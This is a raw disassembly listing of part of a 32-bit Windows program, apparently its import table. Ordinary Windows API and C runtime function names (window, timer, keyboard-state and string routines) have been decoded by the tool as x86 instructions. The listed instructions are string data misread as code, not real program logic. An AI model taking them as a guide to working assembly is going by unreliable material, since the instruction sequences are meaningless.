  425f49:	add    BYTE PTR ds:0x74654701,dl
  425f4f:	inc    esi
  425f50:	outs   dx,DWORD PTR ds:[esi]
  425f51:	jb     0x425fb8
  425f53:	addr16 jb 0x425fc5
  425f56:	jne    0x425fc6
  425f58:	fs push edi
  425f5a:	imul   ebp,DWORD PTR [esi+0x64],0x3800776f
  425f61:	add    DWORD PTR [edi+0x65],eax
  425f64:	je     0x425fb3
  425f66:	outs   dx,BYTE PTR gs:[esi]
  425f68:	jne    0x425fbd
  425f6a:	je     0x425fde
  425f6c:	imul   ebp,DWORD PTR [esi+0x67],0x58000041
  425f73:	add    BYTE PTR [ebx+0x72],al
  425f76:	gs popa 
  425f78:	je     0x425fdf
  425f7a:	inc    esp
  425f7b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  425f82:	jb     0x425fe5
  425f84:	ins    DWORD PTR es:[edi],dx
  425f85:	inc    ecx
  425f86:	add    BYTE PTR [eax],al
  425f88:	call   0x65b2ae8e
  425f8d:	outs   dx,BYTE PTR ds:[esi]
  425f8e:	dec    ecx
  425f8f:	arpl   WORD PTR [edi+0x6e],bp
  425f92:	add    BYTE PTR [eax],al
  425f94:	jecxz  0x425f96
  425f96:	inc    esi
  425f97:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  425f9e:	outs   dx,DWORD PTR ds:[esi]
  425f9f:	ja     0x425fe6
  425fa1:	js     0x425ffa
  425fa3:	add    dh,cl
  425fa5:	add    DWORD PTR [ebp+0x65],ecx
  425fa8:	jae    0x42601d
  425faa:	popa   
  425fab:	addr16 gs inc edx
  425fae:	outs   dx,DWORD PTR ds:[esi]
  425faf:	js     0x425ff2
  425fb1:	add    BYTE PTR [eax+eax*1+0x43],al
  425fb5:	ins    BYTE PTR es:[edi],dx
  425fb6:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  425fbd:	jb     0x425fbf
  425fbf:	add    BYTE PTR [ebp+0x61694400],bl
  425fc5:	ins    BYTE PTR es:[edi],dx
  425fc6:	outs   dx,DWORD PTR ds:[esi]
  425fc7:	addr16 inc edx
  425fc9:	outs   dx,DWORD PTR ds:[esi]
  425fca:	js     0x42601c
  425fcc:	popa   
  425fcd:	jb     0x426030
  425fcf:	ins    DWORD PTR es:[edi],dx
  425fd0:	push   edi
  425fd1:	add    BYTE PTR [ebx+0x1],al
  425fd4:	inc    edi
  425fd5:	gs je  0x426026
  425fd8:	gs js  0x42604f
  425fdb:	inc    esp
  425fdc:	ins    BYTE PTR es:[edi],dx
  425fdd:	addr16 push esp
  425fdf:	popa   
  425fe0:	bound  ecx,QWORD PTR [ecx+0x74]
  425fe3:	gs ins DWORD PTR es:[edi],dx
  425fe5:	add    BYTE PTR [eax+0x61724400],dh
  425feb:	ja     0x426033
  425fed:	outs   dx,DWORD PTR ds:[esi]
  425fee:	arpl   WORD PTR [ebp+0x73],si
  425ff1:	push   edx
  425ff2:	arpl   WORD PTR gs:[eax+eax*1-0x77],si
  425ff7:	add    DWORD PTR [ecx+0x6e],ecx
  425ffa:	jbe    0x42605d
  425ffc:	ins    BYTE PTR es:[edi],dx
  425ffd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  426005:	je     0x426007
  426007:	add    BYTE PTR [esi+0x6c694b01],ah
  42600d:	ins    BYTE PTR es:[edi],dx
  42600e:	push   esp
  42600f:	imul   ebp,DWORD PTR [ebp+0x65],0x1370072
  426016:	inc    edi
  426017:	gs je  0x426067
  42601a:	outs   dx,BYTE PTR gs:[esi]
  42601c:	jne    0x426071
  42601e:	je     0x426081
  426020:	je     0x426087
  426022:	add    BYTE PTR [eax],al
  426024:	cmp    al,BYTE PTR [edx]
  426026:	push   ebx
  426027:	gs je  0x42606d
  42602a:	jne    0x42609e
  42602c:	jae    0x42609d
  42602e:	jb     0x426080
  426030:	outs   dx,DWORD PTR ds:[esi]
  426031:	jae    0x426033
  426033:	add    BYTE PTR [eax+0x2],ch
  426036:	push   ebx
  426037:	gs je  0x42608f
  42603a:	jae    0x4260a1
  42603c:	jb     0x42608d
  42603e:	bound  ebp,QWORD PTR [edx+0x65]
  426041:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  426045:	outs   dx,WORD PTR ds:[esi]
  426047:	jb     0x4260b6
  426049:	popa   
  42604a:	je     0x4260b5
  42604c:	outs   dx,DWORD PTR ds:[esi]
  42604d:	outs   dx,BYTE PTR ds:[esi]
  42604e:	push   edi
  42604f:	add    BYTE PTR [ebx+0x61724400],ch
  426055:	ja     0x426098
  426057:	outs   dx,BYTE PTR ds:[esi]
  426058:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  42605f:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  426064:	mov    dl,0x1
  426066:	dec    esp
  426067:	outs   dx,DWORD PTR ds:[esi]
  426068:	popa   
  426069:	fs dec ecx
  42606b:	ins    DWORD PTR es:[edi],dx
  42606c:	popa   
  42606d:	addr16 gs push edi
  426070:	add    BYTE PTR [eax],al
  426072:	cdq    
  426073:	add    BYTE PTR [ecx+ebp*2+0x61],al
  426077:	ins    BYTE PTR es:[edi],dx
  426078:	outs   dx,DWORD PTR ds:[esi]
  426079:	addr16 inc edx
  42607b:	outs   dx,DWORD PTR ds:[esi]
  42607c:	js     0x4260c7
  42607e:	outs   dx,BYTE PTR ds:[esi]
  42607f:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  426087:	jb     0x4260ea
  426089:	ins    DWORD PTR es:[edi],dx
  42608a:	inc    ecx
  42608b:	add    al,ah
  42608d:	add    DWORD PTR [edi+0x65],ecx
  426090:	ins    DWORD PTR es:[edi],dx
  426091:	push   esp
  426092:	outs   dx,DWORD PTR ds:[esi]
  426093:	inc    ebx
  426094:	push   0x417261
  426099:	add    bh,al
  42609b:	add    BYTE PTR [ebp+0x6e],al
  42609e:	jne    0x42610d
  4260a0:	inc    ebx
  4260a1:	push   0x57646c69
  4260a6:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4260ad:	add    BYTE PTR [ecx],cl
  4260af:	add    DWORD PTR [edi+0x65],eax
  4260b2:	je     0x4260f7
  4260b4:	jne    0x426128
  4260b6:	jae    0x426127
  4260b8:	jb     0x42610a
  4260ba:	outs   dx,DWORD PTR ds:[esi]
  4260bb:	jae    0x4260bd
  4260bd:	add    BYTE PTR [esi],dl
  4260bf:	add    dl,BYTE PTR [edx+0x65]
  4260c2:	ins    DWORD PTR es:[edi],dx
  4260c3:	outs   dx,DWORD PTR ds:[esi]
  4260c4:	jbe    0x42612b
  4260c6:	dec    ebp
  4260c7:	outs   dx,BYTE PTR gs:[esi]
  4260c9:	jne    0x4260cb
  4260cb:	add    al,bl
  4260cd:	add    DWORD PTR [ebp+0x6f],ecx
  4260d0:	outs   dx,BYTE PTR ds:[esi]
  4260d1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4260d9:	push   eax
  4260da:	outs   dx,DWORD PTR ds:[esi]
  4260db:	imul   ebp,DWORD PTR [esi+0x74],0x53550000
  4260e2:	inc    ebp
  4260e3:	push   edx
  4260e4:	xor    esi,DWORD PTR [edx]
  4260e6:	cs fs ins BYTE PTR es:[edi],dx
  4260e9:	ins    BYTE PTR es:[edi],dx
  4260ea:	add    BYTE PTR [eax],al
  4260ec:	mov    ebx,0x73655203
  4260f1:	gs je  0x426139
  4260f4:	jbe    0x42615b
  4260f6:	outs   dx,BYTE PTR ds:[esi]
  4260f7:	je     0x4260f9
  4260f9:	add    bl,bl
  4260fb:	add    BYTE PTR [ebx+0x72],al
  4260fe:	gs popa 
  426100:	je     0x426167
  426102:	dec    ebp
  426103:	popa   
  426104:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  42610c:	sbb    BYTE PTR [edx],al
  42610e:	inc    edi
  42610f:	gs je  0x426160
  426112:	jne    0x426181
  426114:	bound  esp,QWORD PTR [ebp+0x72]
  426117:	inc    esi
  426118:	outs   dx,DWORD PTR ds:[esi]
  426119:	jb     0x426188
  42611b:	popa   
  42611c:	je     0x426175
  42611e:	add    BYTE PTR [eax],al
  426120:	pusha  
  426121:	add    DWORD PTR [esi+0x69],eax
  426124:	outs   dx,BYTE PTR ds:[esi]
  426125:	fs inc esi
  426127:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  42612e:	gs push edi
  426130:	add    BYTE PTR [eax],al
  426132:	jecxz  0x426134
  426134:	inc    ebx
  426135:	jb     0x42619c
  426137:	popa   
  426138:	je     0x42619f
  42613a:	push   eax
  42613b:	imul   esi,DWORD PTR [eax+0x65],0x2850000
  426142:	inc    edi
  426143:	gs je  0x42619d
  426146:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  42614d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  426154:	jns    0x4261ad
  426156:	add    BYTE PTR [eax],al
  426158:	fiadd  DWORD PTR [edx]
  42615a:	dec    ecx
  42615b:	jae    0x4261b3
  42615d:	popa   
  42615e:	ins    BYTE PTR es:[edi],dx
  42615f:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  426167:	addr16 gs inc edi
  42616a:	jb     0x4261db
  42616c:	jne    0x4261de
  42616e:	add    BYTE PTR [eax],al
  426170:	outs   dx,DWORD PTR ds:[esi]
  426171:	add    DWORD PTR [esi+0x69],eax
  426174:	outs   dx,BYTE PTR ds:[esi]
  426175:	fs push edx
  426177:	gs jae 0x4261e9
  42617a:	jne    0x4261ee
  42617c:	arpl   WORD PTR [ebp+0x57],sp
  42617f:	add    al,cl
  426181:	add    cl,BYTE PTR [ecx+0x73]
  426184:	inc    edx
  426185:	popa   
  426186:	fs inc ebx
  426188:	outs   dx,DWORD PTR ds:[esi]
  426189:	fs gs push eax
  42618c:	je     0x426200
  42618e:	add    BYTE PTR [eax],al
  426190:	mov    BYTE PTR [eax],al
  426192:	inc    ecx
  426193:	jb     0x4261fa
  426195:	inc    esi
  426196:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  42619e:	dec    esi
  42619f:	push   ebx
  4261a0:	dec    ecx
  4261a1:	add    BYTE PTR [eax+0x4],al
  4261a4:	push   ebx
  4261a5:	gs je  0x4261fc
  4261a8:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4261af:	jne    0x426216
  4261b1:	push   esp
  4261b2:	imul   ebp,DWORD PTR [ebp+0x65],0x90000072
  4261b9:	add    DWORD PTR [edi+0x65],eax
  4261bc:	je     0x426201
  4261be:	push   eax
  4261bf:	dec    ecx
  4261c0:	outs   dx,BYTE PTR ds:[esi]
  4261c1:	outs   dx,WORD PTR ds:[esi]
  4261c3:	add    BYTE PTR [edi],ah
  4261c5:	add    al,0x53
  4261c7:	gs je  0x426218
  4261ca:	popa   
  4261cb:	ins    DWORD PTR es:[edi],dx
  4261cc:	gs fs push eax
  4261cf:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  4261d6:	ins    BYTE PTR es:[edi],dx
  4261d7:	gs push ebx
  4261d9:	je     0x42623c
  4261db:	je     0x426242
  4261dd:	add    BYTE PTR [ebp+0x69615704],cl
  4261e3:	je     0x42622b
  4261e5:	outs   dx,DWORD PTR ds:[esi]
  4261e6:	jb     0x426235
  4261e8:	jne    0x426256
  4261ea:	je     0x426255
  4261ec:	jo     0x42625a
  4261ee:	gs dec edi
  4261f0:	bound  ebp,QWORD PTR [edx+0x65]
  4261f3:	arpl   WORD PTR [ebx+esi*2+0x45],si
  4261f7:	js     0x4261f9
  4261f9:	add    BYTE PTR [esi+0x4],cl
  4261fc:	push   ebx
  4261fd:	ins    BYTE PTR es:[edi],dx
  4261fe:	gs gs jo 0x426247
  426202:	js     0x426204
  426204:	mov    ah,0x3
  426206:	push   edx
  426207:	gs ins DWORD PTR es:[edi],dx
  426209:	outs   dx,DWORD PTR ds:[esi]
  42620a:	jbe    0x426271
  42620c:	inc    esp
  42620d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  426214:	jns    0x42626d
  426216:	add    BYTE PTR [eax],al
  426218:	dec    edi
  426219:	add    al,BYTE PTR [edi+0x65]
  42621c:	je     0x426271
  42621e:	jns    0x426293
  426220:	je     0x426287
  426222:	ins    DWORD PTR es:[edi],dx
  426223:	inc    esp
  426224:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42622b:	jns    0x42626e
  42622d:	add    BYTE PTR [ebp+0x1],bl
  426230:	inc    esi
  426231:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  426238:	je     0x426280
  42623a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4360000
  426242:	push   ebx
  426243:	gs je  0x42629a
  426246:	push   0x64616572
  42624b:	inc    ebx
  42624c:	outs   dx,DWORD PTR ds:[esi]
  42624d:	outs   dx,BYTE PTR ds:[esi]
  42624e:	je     0x4262b5
  426250:	js     0x4262c6
  426252:	add    BYTE PTR [eax],al
  426254:	out    dx,al
  426255:	add    DWORD PTR [edi+0x65],eax
  426258:	je     0x4262a0
  42625a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  426262:	mov    dl,0x0
  426264:	inc    ebx
  426265:	outs   dx,DWORD PTR ds:[esi]
  426266:	ins    DWORD PTR es:[edi],dx
  426267:	jo     0x4262ca
  426269:	jb     0x4262d0
  42626b:	inc    esi
  42626c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  426274:	ja     0x426277
  426276:	inc    esi
  426277:	ins    BYTE PTR es:[edi],dx
  426278:	jne    0x4262ed
  42627a:	push   0x656c6946
  42627f:	inc    edx
  426280:	jne    0x4262e8
  426282:	data16 gs jb 0x4262f9
  426286:	add    BYTE PTR [eax],al
  426288:	int3   
  426289:	add    al,0x6c
  42628b:	jae    0x426301
  42628d:	jb     0x4262f2
  42628f:	jo     0x42630a
  426291:	outs   dx,BYTE PTR ds:[esi]
  426292:	push   edi
  426293:	add    BYTE PTR [eax+0x61654802],dh
  426299:	jo     0x4262f0
  42629b:	outs   dx,BYTE PTR ds:[esi]
  42629c:	ins    BYTE PTR es:[edi],dx
  42629d:	outs   dx,DWORD PTR ds:[esi]
  42629e:	arpl   WORD PTR [ebx+0x0],bp
  4262a1:	add    BYTE PTR [edi+0x6c655203],ch
  4262a7:	gs popa 
  4262a9:	jae    0x426310
  4262ab:	dec    ebp
  4262ac:	jne    0x426322
  4262ae:	gs js  0x4262b1
  4262b1:	add    BYTE PTR [eax],cl
  4262b3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4262b7:	fs dec esp
  4262b9:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  4262c0:	add    BYTE PTR [eax],al
  4262c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262c3:	add    BYTE PTR [ebx+0x61],al
  4262c6:	outs   dx,BYTE PTR ds:[esi]
  4262c7:	arpl   WORD PTR [ebp+0x6c],sp
  4262ca:	push   edi
  4262cb:	popa   
  4262cc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4262d4:	ins    DWORD PTR es:[edi],dx
  4262d5:	gs jb  0x4262d8
  4262d8:	add    al,0x1
  4262da:	inc    esp
  4262db:	gs ins BYTE PTR es:[edi],dx
  4262dd:	gs je  0x426345
  4262e0:	inc    esi
  4262e1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4300e000
  4262e9:	jb     0x426350
  4262eb:	popa   
  4262ec:	je     0x426353
  4262ee:	dec    ebp
  4262ef:	jne    0x426365
  4262f1:	gs js  0x42634b
  4262f4:	add    BYTE PTR [eax],al
  4262f6:	add    al,BYTE PTR [bx+0x65]
  4262fa:	je     0x426350
  4262fc:	push   0x64616572
  426301:	dec    esp
  426302:	outs   dx,DWORD PTR ds:[esi]
  426303:	arpl   WORD PTR [ecx+0x6c],sp
  426306:	add    BYTE PTR gs:[edi+0x2],ch
  42630a:	inc    edi
  42630b:	gs je  0x426362
  42630e:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  426315:	popa   
  426316:	je     0x426359
  426318:	add    BYTE PTR [eax],al
  42631a:	into   
  42631b:	add    al,0x6c
  42631d:	jae    0x426393
  42631f:	jb     0x42638d
  426321:	outs   dx,BYTE PTR gs:[esi]
  426323:	inc    ecx
  426324:	add    BYTE PTR [eax],al
  426326:	adc    al,0x3
  426328:	dec    esp
  426329:	outs   dx,DWORD PTR ds:[esi]
  42632a:	arpl   WORD PTR [ecx+0x6c],sp
  42632d:	push   ebx
  42632e:	imul   edi,DWORD PTR [edx+0x65],0x46016d00
  426335:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  42633c:	jne    0x4263b0
  42633e:	arpl   WORD PTR [ebp+0x45],sp
  426341:	js     0x426384
  426343:	add    BYTE PTR [ecx+eax*1+0x46],bl
  426347:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42634e:	je     0x426393
  426350:	push   0x65676e61
  426355:	dec    esi
  426356:	outs   dx,DWORD PTR ds:[esi]
  426357:	je     0x4263c2
  426359:	imul   sp,WORD PTR [ebx+0x61],0x6974
  42635f:	outs   dx,DWORD PTR ds:[esi]
  426360:	outs   dx,BYTE PTR ds:[esi]
  426361:	push   edi
  426362:	add    BYTE PTR [eax],al
  426364:	xchg   edi,eax
  426365:	add    DWORD PTR [edi+0x65],eax
  426368:	je     0x4263ad
  42636a:	outs   dx,DWORD PTR ds:[esi]
  42636b:	ins    DWORD PTR es:[edi],dx
  42636c:	ins    DWORD PTR es:[edi],dx
  42636d:	dec    ebp
  42636e:	outs   dx,DWORD PTR ds:[esi]
  42636f:	fs gs ins DWORD PTR es:[edi],dx
  426372:	push   ebx
  426373:	je     0x4263d6
  426375:	je     0x4263ec
  426377:	jae    0x426379
  426379:	add    BYTE PTR [edi],dl
  42637b:	add    al,BYTE PTR [edi+0x65]
  42637e:	je     0x4263cd
  426380:	outs   dx,DWORD PTR ds:[esi]
  426381:	fs jne 0x4263f0
  426384:	gs dec eax
  426386:	popa   
  426387:	outs   dx,BYTE PTR ds:[esi]
  426388:	fs ins BYTE PTR es:[edi],dx
  42638a:	gs inc ebp
  42638c:	js     0x4263e5
  42638e:	add    BYTE PTR [eax],al
  426390:	cmp    eax,DWORD PTR [ebx]
  426392:	dec    edi
  426393:	jo     0x4263fa
  426395:	outs   dx,BYTE PTR ds:[esi]
  426396:	inc    esi
  426397:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  42639f:	outs   dx,BYTE PTR ds:[esi]
  4263a0:	addr16 inc ecx
  4263a2:	add    BYTE PTR [eax],al
  4263a4:	sbb    BYTE PTR [ebx+edx*2],al
  4263a7:	gs je  0x4263f0
  4263aa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4263b2:	gs jb  0x4263b5
  4263b5:	add    BYTE PTR [eax+0x2],dh
  4263b8:	inc    edi
  4263b9:	gs je  0x426410
  4263bc:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  4263c3:	popa   
  4263c4:	je     0x42641d
  4263c6:	add    BYTE PTR [eax],al
  4263c8:	xchg   ebp,eax
  4263c9:	add    DWORD PTR [edi+0x65],eax
  4263cc:	je     0x426411
  4263ce:	outs   dx,DWORD PTR ds:[esi]
  4263cf:	ins    DWORD PTR es:[edi],dx
  4263d0:	ins    DWORD PTR es:[edi],dx
  4263d1:	inc    ebx
  4263d2:	outs   dx,DWORD PTR ds:[esi]
  4263d3:	outs   dx,BYTE PTR ds:[esi]
  4263d4:	imul   sp,WORD PTR [edi+0x0],0x2ce
  4263da:	dec    ecx
  4263db:	jae    0x42641f
  4263dd:	popa   
  4263de:	fs push edi
  4263e0:	jb     0x42644b
  4263e2:	je     0x426449
  4263e4:	push   eax
  4263e5:	je     0x426459
  4263e7:	add    BYTE PTR [ecx+eax*1+0x46],ch
  4263eb:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  4263f2:	jne    0x426466
  4263f4:	arpl   WORD PTR [ebp+0x41],sp
  4263f7:	add    bl,ah
  4263f9:	add    edx,DWORD PTR [ebx+0x65]
  4263fc:	je     0x426441
  4263fe:	outs   dx,DWORD PTR ds:[esi]
  4263ff:	ins    DWORD PTR es:[edi],dx
  426400:	ins    DWORD PTR es:[edi],dx
  426401:	push   ebx
  426402:	je     0x426465
  426404:	je     0x42646b
  426406:	add    BYTE PTR [eax],al
  426408:	imul   eax,DWORD PTR [edx],0x54746547
  42640e:	push   0x64616572
  426413:	push   eax
  426414:	jb     0x42647f
  426416:	outs   dx,DWORD PTR ds:[esi]
  426417:	jb     0x426482
  426419:	je     0x426494
  42641b:	add    BYTE PTR [ebx],al
  42641d:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  426421:	gs je  0x426489
  426424:	inc    esi
  426425:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x53044100
  42642d:	gs je  0x426485
  426430:	outs   dx,BYTE PTR ds:[esi]
  426431:	push   0x6c646e61
  426436:	gs fs inc ebp
  426439:	js     0x42649e
  42643b:	gs jo  0x4264b2
  42643e:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  426445:	gs jb  0x426448
  426448:	mov    WORD PTR [ecx],es
  42644a:	inc    edi
  42644b:	gs je  0x42648f
  42644e:	je     0x4264bf
  426450:	ins    DWORD PTR es:[edi],dx
  426451:	dec    esi
  426452:	popa   
  426453:	ins    DWORD PTR es:[edi],dx
  426454:	gs push edi
  426456:	add    BYTE PTR [eax],al
  426458:	rol    BYTE PTR [esp+ebp*2],0x73
  42645c:	je     0x4264d0
  42645e:	arpl   WORD PTR [ecx+0x74],sp
  426461:	push   edi
  426462:	add    BYTE PTR [eax],al
  426464:	jae    0x426468
  426466:	inc    edi
  426467:	gs je  0x4264bf
  42646a:	jae    0x4264d1
  42646c:	jb     0x4264b2
  42646e:	gs popaw 
  426471:	jne    0x4264df
  426473:	je     0x4264c1
  426475:	inc    ebx
  426476:	dec    ecx
  426477:	inc    esp
  426478:	add    BYTE PTR [eax],al
  42647a:	dec    ebx
  42647b:	inc    ebp
  42647c:	push   edx
  42647d:	dec    esi
  42647e:	inc    ebp
  42647f:	dec    esp
  426480:	xor    esi,DWORD PTR [edx]
  426482:	cs fs ins BYTE PTR es:[edi],dx
  426485:	ins    BYTE PTR es:[edi],dx
  426486:	add    BYTE PTR [eax],al
  426488:	cmc    
  426489:	add    BYTE PTR [edi+0x63],bl
  42648c:	outs   dx,DWORD PTR ds:[esi]
  42648d:	outs   dx,BYTE PTR ds:[esi]
  42648e:	je     0x426502
  426490:	outs   dx,DWORD PTR ds:[esi]
  426491:	ins    BYTE PTR es:[edi],dx
  426492:	data16 jo 0x426495
  426495:	add    BYTE PTR [ecx+0x77736903],ch
  42649b:	jae    0x42650d
  42649d:	popa   
  42649e:	arpl   WORD PTR [ebp+0x0],sp
  4264a1:	add    BYTE PTR [edi+0x74656703],cl
  4264a7:	jae    0x4264a9
  4264a9:	add    BYTE PTR [ebx+0x70736903],bl
  4264af:	jb     0x42651a
  4264b1:	outs   dx,BYTE PTR ds:[esi]
  4264b2:	je     0x4264b4
  4264b4:	mov    bl,0x0
  4264b6:	pop    edi
  4264b7:	pop    edi
  4264b8:	jae    0x42651f
  4264ba:	je     0x42651b
  4264bc:	popa   
  4264bd:	jo     0x42652f
  4264bf:	pop    edi
  4264c0:	je     0x42653b
  4264c2:	jo     0x426529
  4264c4:	add    BYTE PTR [eax],al
  4264c6:	mov    al,ds:0x705f5f00
  4264cb:	pop    edi
  4264cc:	pop    edi
  4264cd:	ins    WORD PTR es:[edi],dx
  4264cf:	outs   dx,DWORD PTR ds:[esi]
  4264d0:	fs add BYTE PTR gs:[eax],al
  4264d4:	xor    DWORD PTR [edi+esi*2],eax
  4264d7:	arpl   WORD PTR [ebx+0x73],si
  4264da:	je     0x42654e
  4264dc:	add    BYTE PTR [eax],al
  4264de:	cli    
  4264df:	add    esi,DWORD PTR [ebx+0x74]
  4264e2:	jb     0x426558
  4264e4:	outs   dx,DWORD PTR ds:[esi]
  4264e5:	imul   eax,DWORD PTR [eax],0x0
  4264e8:	out    0x3,eax
  4264ea:	jae    0x426560
  4264ec:	jb     0x426551
  4264ee:	outs   dx,DWORD PTR ds:[esi]
  4264ef:	ins    BYTE PTR es:[edi],dx
  4264f0:	ins    BYTE PTR es:[edi],dx
  4264f1:	add    BYTE PTR [ebx+0x705f5f00],bl
  4264f7:	pop    edi
  4264f8:	pop    edi
  4264f9:	arpl   WORD PTR [edi+0x6d],bp
  4264fc:	ins    DWORD PTR es:[edi],dx
  4264fd:	outs   dx,DWORD PTR ds:[esi]
  4264fe:	fs add BYTE PTR gs:[eax],al
  426502:	fild   DWORD PTR [eax]
  426504:	pop    edi
  426505:	popa   
  426506:	ins    DWORD PTR es:[edi],dx
  426507:	jae    0x426570
  426509:	pop    edi
  42650a:	gs js  0x426576
  42650d:	je     0x42650f
  42650f:	add    BYTE PTR [esi+0x6e695f01],al
  426515:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x88006d72
  42651d:	add    esp,DWORD PTR [esi+0x77]
  426520:	jb     0x42658b
  426522:	je     0x426589
  426524:	add    BYTE PTR [eax],al
  426526:	sahf   
  426527:	add    DWORD PTR [edi+0x69],ebx
  42652a:	jae    0x426599
  42652c:	bound  esp,QWORD PTR [edx+0x6c]
  42652f:	gs popa 
  426531:	add    BYTE PTR fs:[eax],al
  426534:	jge    0x426539
  426536:	data16 jb 0x42659e
  426539:	add    BYTE PTR gs:[eax],al
  42653c:	lds    eax,FWORD PTR [ebx]
  42653e:	jo     0x4265b2
  426540:	imul   ebp,DWORD PTR [esi+0x74],0x9a000066
  426547:	add    ebp,DWORD PTR [ecx+0x73]
  42654a:	ins    BYTE PTR es:[edi],dx
  42654b:	outs   dx,DWORD PTR ds:[esi]
  42654c:	ja     0x4265b3
  42654e:	jb     0x426550
  426550:	stos   DWORD PTR es:[edi],eax
  426551:	add    ebp,DWORD PTR [ecx+0x73]
  426554:	ja     0x4265ce
  426556:	imul   esp,DWORD PTR fs:[edi+0x69],0x3780074
  42655e:	data16 jo 0x4265d6
  426561:	je     0x4265c6
  426563:	add    BYTE PTR [edx+0x0],dl
  426566:	pop    edi
  426567:	pop    eax
  426568:	arpl   WORD PTR [eax+0x74],si
  42656b:	inc    esi
  42656c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3dd0072
  426574:	jae    0x4265e6
  426576:	jb     0x4265e1
  426578:	outs   dx,BYTE PTR ds:[esi]
  426579:	je     0x4265e1
  42657b:	add    BYTE PTR [ecx],cl
  42657d:	add    al,0x74
  42657f:	outs   dx,DWORD PTR ds:[esi]
  426580:	ins    BYTE PTR es:[edi],dx
  426581:	outs   dx,DWORD PTR ds:[esi]
  426582:	ja     0x4265e9
  426584:	jb     0x426586
  426586:	and    eax,DWORD PTR [ecx]
  426588:	pop    edi
  426589:	gs js  0x4265f5
  42658c:	je     0x42658e
  42658e:	add    eax,DWORD PTR [ebx+esi*2]
  426591:	jns    0x426606
  426593:	je     0x4265fa
  426595:	ins    DWORD PTR es:[edi],dx
  426596:	add    BYTE PTR [eax],al
  426598:	call   0x65a5c49d
  42659d:	js     0x426608
  42659f:	je     0x4265a1
  4265a1:	add    BYTE PTR ds:0x73637704,dh
  4265a7:	je     0x426618
  4265a9:	ins    BYTE PTR es:[edi],dx
  4265aa:	add    BYTE PTR [eax],al
  4265ac:	iret   
  4265ad:	add    esi,DWORD PTR [edx+0x61]
  4265b0:	outs   dx,BYTE PTR ds:[esi]
  4265b1:	add    BYTE PTR fs:[eax],al
  4265b4:	mov    ch,0x0
  4265b6:	pop    edi
  4265b7:	pop    edi
  4265b8:	jae    0x42661f
  4265ba:	je     0x426631
  4265bc:	jae    0x426623
  4265be:	jb     0x42662d
  4265c0:	popa   
  4265c1:	je     0x42662b
  4265c3:	gs jb  0x426638
  4265c6:	add    BYTE PTR [eax],al
  4265c8:	and    eax,DWORD PTR [edi+esi*2]
  4265cb:	arpl   WORD PTR [ebx+0x63],si
  4265ce:	jae    0x426640
  4265d0:	outs   dx,BYTE PTR ds:[esi]
  4265d1:	add    ch,bh
  4265d3:	add    esi,DWORD PTR [ebx+0x74]
  4265d6:	jb     0x42664c
  4265d8:	outs   dx,DWORD PTR ds:[esi]
  4265d9:	jne    0x426647
  4265db:	add    BYTE PTR [esp+eax*1],ch
  4265de:	ja     0x426643
  4265e0:	jae    0x426652
  4265e2:	bound  esi,QWORD PTR [edx+0x6b]
  4265e5:	add    BYTE PTR [eax+0x3],ah
  4265e8:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4265ec:	imul   eax,DWORD PTR [eax],0xffffff85
  4265ef:	add    esp,DWORD PTR [esi+0x74]
  4265f2:	gs ins BYTE PTR es:[edi],dx
  4265f4:	ins    BYTE PTR es:[edi],dx
  4265f5:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  4265fc:	outs   dx,BYTE PTR ds:[esi]
  4265fd:	jne    0x42666c
  4265ff:	add    ch,ah
  426601:	add    esi,DWORD PTR [ebx+0x74]
  426604:	jb     0x426669
  426606:	push   0xfc000072
  42660b:	add    esi,DWORD PTR [ebx+0x74]
  42660e:	jb     0x426684
  426610:	outs   dx,DWORD PTR ds:[esi]
  426611:	ins    BYTE PTR es:[edi],dx
  426612:	add    BYTE PTR [eax],al
  426614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426615:	add    ebp,DWORD PTR [ecx+0x73]
  426618:	ja     0x42667e
  42661a:	imul   esp,DWORD PTR [edi+0x69],0xeb000074
  426621:	add    esi,DWORD PTR [ebx+0x74]
  426624:	jb     0x42668b
  426626:	jb     0x42669a
  426628:	outs   dx,DWORD PTR ds:[esi]
